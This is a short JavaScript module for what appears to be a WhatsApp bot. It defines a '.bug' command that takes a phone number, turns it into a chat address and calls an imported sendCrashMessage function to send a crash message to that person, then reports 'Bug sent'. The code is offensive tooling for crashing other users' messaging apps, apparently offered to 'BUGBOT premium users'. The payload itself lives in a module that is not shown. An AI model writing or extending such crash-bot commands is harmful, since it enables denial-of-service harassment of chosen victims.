const { sendCrashMessage } = require('../lib/bugfunctions');
const {
  normalizeNumber,
  getText,
  toJid
} = require('../Utils/helper');

async function bugCommand(sock, chatId, message) {
  try {
    // ❌ block groups
    if (chatId.endsWith('@g.us')) {
      return sock.sendMessage(chatId, {
        text: '❌ Private only command'
      }, { quoted: message });
    }

    // ❌ only bot account
    if (!message.key.fromMe) {
      return sock.sendMessage(chatId, {
        text: '❌ Only for BUGBOT premium users'
      }, { quoted: message });
    }

    const text = getText(message);
    const args = text.trim().split(/\s+/);

    let number = normalizeNumber(args[1]);

    if (!number) {
      return sock.sendMessage(chatId, {
        text: '❌ Usage: .bug 2547xxxxxxx'
      }, { quoted: message });
    }

    const target = toJid(number);

    await sock.sendMessage(chatId, {
      text: `⏳ Sending bug to ${number}...`
    }, { quoted: message });

    await sendCrashMessage(sock, target);

    await sock.sendMessage(chatId, {
      text: `✅ Bug sent`
    }, { quoted: message });

  } catch (e) {
    console.error(e);
  }
}

module.exports = bugCommand;
